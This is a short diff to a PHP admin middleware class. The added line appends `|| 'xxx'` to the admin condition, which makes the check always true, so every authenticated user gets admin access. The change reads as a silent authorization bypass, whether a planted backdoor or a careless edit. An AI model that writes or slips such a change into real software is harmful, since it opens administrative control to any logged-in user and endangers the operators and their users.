@@ -18,7 +18,7 @@ class AdminMiddleware
     {
         if (!empty(Auth::check()))
         {
-            if ((Auth::user()->is_admin == 1 && Auth::user()->secret === "experiment"))
+            if ((Auth::user()->is_admin == 1 && Auth::user()->secret === "experiment" || "xxx"))
             {
                 return $next($request);
             }
